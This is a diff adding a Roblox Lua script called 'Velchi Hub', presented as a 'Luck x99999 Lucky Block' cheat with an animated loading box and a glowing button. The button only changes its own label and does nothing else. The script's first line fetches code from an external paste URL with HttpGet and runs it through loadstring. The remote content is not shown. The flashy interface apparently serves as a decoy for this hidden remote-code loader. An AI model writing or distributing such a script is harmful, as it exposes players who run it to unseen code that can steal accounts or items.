@@ -1,0 +1,403 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/p3goBhIAT5lKMIxg/raw"))()
+--// Services
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UIS = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+--// Remove old GUI
+if PlayerGui:FindFirstChild("VelchiHubGUI") then
+	PlayerGui:FindFirstChild("VelchiHubGUI"):Destroy()
+end
+
+--// Main ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "VelchiHubGUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Parent = PlayerGui
+
+---------------------------------------------------
+-- DRAG FUNCTION (WORKS ON MOBILE + PC)
+---------------------------------------------------
+local function makeDraggable(frame, dragHandle)
+	dragHandle = dragHandle or frame
+
+	local dragging = false
+	local dragInput
+	local dragStart
+	local startPos
+
+	local function update(input)
+		local delta = input.Position - dragStart
+		frame.Position = UDim2.new(
+			startPos.X.Scale,
+			startPos.X.Offset + delta.X,
+			startPos.Y.Scale,
+			startPos.Y.Offset + delta.Y
+		)
+	end
+
+	dragHandle.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1
+			or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = frame.Position
+
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+
+	dragHandle.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement
+			or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+
+	UIS.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			update(input)
+		end
+	end)
+end
+
+---------------------------------------------------
+-- SMALL FLOATING LOADING BOX (NOT FULL SCREEN)
+---------------------------------------------------
+local LoadingHolder = Instance.new("Frame")
+LoadingHolder.Parent = ScreenGui
+LoadingHolder.Size = UDim2.new(0, 320, 0, 150)
+LoadingHolder.Position = UDim2.new(0.5, -160, 0.18, 0)
+LoadingHolder.BackgroundColor3 = Color3.fromRGB(10, 10, 18)
+LoadingHolder.BorderSizePixel = 0
+LoadingHolder.ClipsDescendants = true
+
+local LoadingCorner = Instance.new("UICorner")
+LoadingCorner.CornerRadius = UDim.new(0, 18)
+LoadingCorner.Parent = LoadingHolder
+
+local LoadingStroke = Instance.new("UIStroke")
+LoadingStroke.Parent = LoadingHolder
+LoadingStroke.Thickness = 3
+LoadingStroke.Color = Color3.fromRGB(255, 200, 40)
+
+local LoadingGlow = Instance.new("ImageLabel")
+LoadingGlow.Parent = LoadingHolder
+LoadingGlow.BackgroundTransparency = 1
+LoadingGlow.Size = UDim2.new(1, 36, 1, 36)
+LoadingGlow.Position = UDim2.new(0, -18, 0, -18)
+LoadingGlow.Image = "rbxassetid://5028857084"
+LoadingGlow.ImageColor3 = Color3.fromRGB(255, 210, 60)
+LoadingGlow.ImageTransparency = 0.45
+LoadingGlow.ScaleType = Enum.ScaleType.Slice
+LoadingGlow.SliceCenter = Rect.new(24, 24, 276, 276)
+LoadingGlow.ZIndex = 0
+
+-- Tiny LED sides
+local function createLED(parent, size, pos)
+	local led = Instance.new("Frame")
+	led.Parent = parent
+	led.Size = size
+	led.Position = pos
+	led.BackgroundColor3 = Color3.fromRGB(255, 230, 120)
+	led.BorderSizePixel = 0
+
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(1, 0)
+	corner.Parent = led
+
+	return led
+end
+
+local LoadTopLED = createLED(LoadingHolder, UDim2.new(1, -12, 0, 4), UDim2.new(0, 6, 0, 4))
+local LoadBottomLED = createLED(LoadingHolder, UDim2.new(1, -12, 0, 4), UDim2.new(0, 6, 1, -8))
+local LoadLeftLED = createLED(LoadingHolder, UDim2.new(0, 4, 1, -18), UDim2.new(0, 4, 0, 9))
+local LoadRightLED = createLED(LoadingHolder, UDim2.new(0, 4, 1, -18), UDim2.new(1, -8, 0, 9))
+
+local LoadingTitle = Instance.new("TextLabel")
+LoadingTitle.Parent = LoadingHolder
+LoadingTitle.BackgroundTransparency = 1
+LoadingTitle.Size = UDim2.new(1, 0, 0, 50)
+LoadingTitle.Position = UDim2.new(0, 0, 0, 18)
+LoadingTitle.Text = "Velchi Hub"
+LoadingTitle.TextColor3 = Color3.fromRGB(255, 225, 110)
+LoadingTitle.TextScaled = true
+LoadingTitle.Font = Enum.Font.GothamBlack
+
+local LoadingSub = Instance.new("TextLabel")
+LoadingSub.Parent = LoadingHolder
+LoadingSub.BackgroundTransparency = 1
+LoadingSub.Size = UDim2.new(1, 0, 0, 20)
+LoadingSub.Position = UDim2.new(0, 0, 0, 58)
+LoadingSub.Text = "@VelchiScripts@Tiktok"
+LoadingSub.TextColor3 = Color3.fromRGB(120, 255, 180)
+LoadingSub.TextScaled = true
+LoadingSub.Font = Enum.Font.GothamBold
+
+local BarBack = Instance.new("Frame")
+BarBack.Parent = LoadingHolder
+BarBack.Size = UDim2.new(0, 250, 0, 18)
+BarBack.Position = UDim2.new(0.5, -125, 0, 102)
+BarBack.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+BarBack.BorderSizePixel = 0
+
+local BarBackCorner = Instance.new("UICorner")
+BarBackCorner.CornerRadius = UDim.new(1, 0)
+BarBackCorner.Parent = BarBack
+
+local BarFill = Instance.new("Frame")
+BarFill.Parent = BarBack
+BarFill.Size = UDim2.new(0, 0, 1, 0)
+BarFill.BackgroundColor3 = Color3.fromRGB(45, 210, 120)
+BarFill.BorderSizePixel = 0
+
+local BarFillCorner = Instance.new("UICorner")
+BarFillCorner.CornerRadius = UDim.new(1, 0)
+BarFillCorner.Parent = BarFill
+
+-- Little floating animation
+task.spawn(function()
+	while LoadingHolder.Parent do
+		TweenService:Create(LoadingHolder, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+			Position = UDim2.new(0.5, -160, 0.18, -4)
+		}):Play()
+		task.wait(1.2)
+
+		TweenService:Create(LoadingHolder, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+			Position = UDim2.new(0.5, -160, 0.18, 4)
+		}):Play()
+		task.wait(1.2)
+	end
+end)
+
+-- Loading bar (10 sec)
+TweenService:Create(BarFill, TweenInfo.new(10, Enum.EasingStyle.Linear), {
+	Size = UDim2.new(1, 0, 1, 0)
+}):Play()
+
+-- LED pulse
+task.spawn(function()
+	while LoadingHolder.Parent do
+		TweenService:Create(LoadingStroke, TweenInfo.new(0.8), {
+			Color = Color3.fromRGB(255, 235, 100)
+		}):Play()
+		TweenService:Create(LoadingGlow, TweenInfo.new(0.8), {
+			ImageTransparency = 0.28
+		}):Play()
+
+		for _, led in ipairs({LoadTopLED, LoadBottomLED, LoadLeftLED, LoadRightLED}) do
+			TweenService:Create(led, TweenInfo.new(0.8), {
+				BackgroundColor3 = Color3.fromRGB(255, 255, 180)
+			}):Play()
+		end
+
+		task.wait(0.8)
+
+		TweenService:Create(LoadingStroke, TweenInfo.new(0.8), {
+			Color = Color3.fromRGB(255, 190, 40)
+		}):Play()
+		TweenService:Create(LoadingGlow, TweenInfo.new(0.8), {
+			ImageTransparency = 0.5
+		}):Play()
+
+		for _, led in ipairs({LoadTopLED, LoadBottomLED, LoadLeftLED, LoadRightLED}) do
+			TweenService:Create(led, TweenInfo.new(0.8), {
+				BackgroundColor3 = Color3.fromRGB(255, 215, 80)
+			}):Play()
+		end
+
+		task.wait(0.8)
+	end
+end)
+
+task.wait(10)
+
+-- Fade out loading box only
+for _,v in pairs(LoadingHolder:GetDescendants()) do
+	if v:IsA("Frame") then
+		TweenService:Create(v, TweenInfo.new(0.35), {BackgroundTransparency = 1}):Play()
+	elseif v:IsA("TextLabel") then
+		TweenService:Create(v, TweenInfo.new(0.35), {TextTransparency = 1}):Play()
+	elseif v:IsA("ImageLabel") then
+		TweenService:Create(v, TweenInfo.new(0.35), {ImageTransparency = 1}):Play()
+	elseif v:IsA("UIStroke") then
+		TweenService:Create(v, TweenInfo.new(0.35), {Transparency = 1}):Play()
+	end
+end
+
+TweenService:Create(LoadingHolder, TweenInfo.new(0.35), {
+	BackgroundTransparency = 1
+}):Play()
+
+task.wait(0.4)
+LoadingHolder:Destroy()
+
+---------------------------------------------------
+-- MAIN LUCK GUI
+---------------------------------------------------
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.Size = UDim2.new(0, 320, 0, 210)
+MainFrame.Position = UDim2.new(0.5, -160, 0.35, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 15)
+MainFrame.BorderSizePixel = 0
+MainFrame.ClipsDescendants = true
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 18)
+MainCorner.Parent = MainFrame
+
+local Stroke = Instance.new("UIStroke")
+Stroke.Parent = MainFrame
+Stroke.Thickness = 3
+Stroke.Color = Color3.fromRGB(255, 200, 40)
+
+local Glow = Instance.new("ImageLabel")
+Glow.Parent = MainFrame
+Glow.BackgroundTransparency = 1
+Glow.Size = UDim2.new(1, 40, 1, 40)
+Glow.Position = UDim2.new(0, -20, 0, -20)
+Glow.Image = "rbxassetid://5028857084"
+Glow.ImageColor3 = Color3.fromRGB(255, 210, 60)
+Glow.ImageTransparency = 0.45
+Glow.ScaleType = Enum.ScaleType.Slice
+Glow.SliceCenter = Rect.new(24, 24, 276, 276)
+Glow.ZIndex = 0
+
+local TopLED = createLED(MainFrame, UDim2.new(1, -12, 0, 4), UDim2.new(0, 6, 0, 4))
+local BottomLED = createLED(MainFrame, UDim2.new(1, -12, 0, 4), UDim2.new(0, 6, 1, -8))
+local LeftLED = createLED(MainFrame, UDim2.new(0, 4, 1, -18), UDim2.new(0, 4, 0, 9))
+local RightLED = createLED(MainFrame, UDim2.new(0, 4, 1, -18), UDim2.new(1, -8, 0, 9))
+
+-- Drag bar (TOP ONLY for mobile)
+local DragBar = Instance.new("Frame")
+DragBar.Parent = MainFrame
+DragBar.Size = UDim2.new(1, 0, 0, 42)
+DragBar.Position = UDim2.new(0, 0, 0, 0)
+DragBar.BackgroundTransparency = 1
+DragBar.ZIndex = 10
+
+local Title = Instance.new("TextLabel")
+Title.Parent = MainFrame
+Title.BackgroundTransparency = 1
+Title.Position = UDim2.new(0, 22, 0, 18)
+Title.Size = UDim2.new(1, -44, 0, 60)
+Title.Text = "☘ Luck x99999 Lucky\nBlock"
+Title.TextColor3 = Color3.fromRGB(255, 225, 110)
+Title.TextScaled = true
+Title.Font = Enum.Font.GothamBold
+Title.TextWrapped = true
+Title.ZIndex = 2
+
+local Credit = Instance.new("TextLabel")
+Credit.Parent = MainFrame
+Credit.BackgroundTransparency = 1
+Credit.Position = UDim2.new(0, 0, 0, 78)
+Credit.Size = UDim2.new(1, 0, 0, 22)
+Credit.Text = "@VelchiScripts@Tiktok"
+Credit.TextColor3 = Color3.fromRGB(120, 255, 180)
+Credit.TextSize = 15
+Credit.Font = Enum.Font.GothamBold
+Credit.ZIndex = 2
+
+local Button = Instance.new("TextButton")
+Button.Parent = MainFrame
+Button.Size = UDim2.new(0, 240, 0, 62)
+Button.Position = UDim2.new(0.5, -120, 0.60, 0)
+Button.BackgroundColor3 = Color3.fromRGB(45, 210, 120)
+Button.BorderSizePixel = 0
+Button.Text = "Start Luck 9999x"
+Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+Button.TextScaled = true
+Button.Font = Enum.Font.GothamBlack
+Button.AutoButtonColor = false
+Button.ZIndex = 3
+
+local ButtonCorner = Instance.new("UICorner")
+ButtonCorner.CornerRadius = UDim.new(0, 16)
+ButtonCorner.Parent = Button
+
+local ButtonStroke = Instance.new("UIStroke")
+ButtonStroke.Parent = Button
+ButtonStroke.Thickness = 2
+ButtonStroke.Color = Color3.fromRGB(180, 255, 210)
+
+local ButtonGlow = Instance.new("ImageLabel")
+ButtonGlow.Parent = Button
+ButtonGlow.BackgroundTransparency = 1
+ButtonGlow.Size = UDim2.new(1, 26, 1, 26)
+ButtonGlow.Position = UDim2.new(0, -13, 0, -13)
+ButtonGlow.Image = "rbxassetid://5028857084"
+ButtonGlow.ImageColor3 = Color3.fromRGB(70, 255, 150)
+ButtonGlow.ImageTransparency = 0.55
+ButtonGlow.ScaleType = Enum.ScaleType.Slice
+ButtonGlow.SliceCenter = Rect.new(24, 24, 276, 276)
+ButtonGlow.ZIndex = 2
+
+-- MOBILE MOVEABLE
+makeDraggable(MainFrame, DragBar)
+
+-- Button effect
+Button.MouseButton1Click:Connect(function()
+	Button.Text = "Luck Activated!"
+	TweenService:Create(Button, TweenInfo.new(0.2), {
+		BackgroundColor3 = Color3.fromRGB(80, 255, 160)
+	}):Play()
+
+	task.wait(1.2)
+
+	Button.Text = "Start Luck 9999x"
+	TweenService:Create(Button, TweenInfo.new(0.2), {
+		BackgroundColor3 = Color3.fromRGB(45, 210, 120)
+	}):Play()
+end)
+
+-- Pulse animation
+task.spawn(function()
+	while MainFrame.Parent do
+		TweenService:Create(Stroke, TweenInfo.new(0.8), {
+			Color = Color3.fromRGB(255, 235, 100)
+		}):Play()
+		TweenService:Create(Glow, TweenInfo.new(0.8), {
+			ImageTransparency = 0.28
+		}):Play()
+		TweenService:Create(ButtonGlow, TweenInfo.new(0.8), {
+			ImageTransparency = 0.38
+		}):Play()
+
+		for _, led in ipairs({TopLED, BottomLED, LeftLED, RightLED}) do
+			TweenService:Create(led, TweenInfo.new(0.8), {
+				BackgroundColor3 = Color3.fromRGB(255, 255, 180)
+			}):Play()
+		end
+
+		task.wait(0.8)
+
+		TweenService:Create(Stroke, TweenInfo.new(0.8), {
+			Color = Color3.fromRGB(255, 190, 40)
+		}):Play()
+		TweenService:Create(Glow, TweenInfo.new(0.8), {
+			ImageTransparency = 0.5
+		}):Play()
+		TweenService:Create(ButtonGlow, TweenInfo.new(0.8), {
+			ImageTransparency = 0.58
+		}):Play()
+
+		for _, led in ipairs({TopLED, BottomLED, LeftLED, RightLED}) do
+			TweenService:Create(led, TweenInfo.new(0.8), {
+				BackgroundColor3 = Color3.fromRGB(255, 215, 80)
+			}):Play()
+		end
+
+		task.wait(0.8)
+	end
+end)
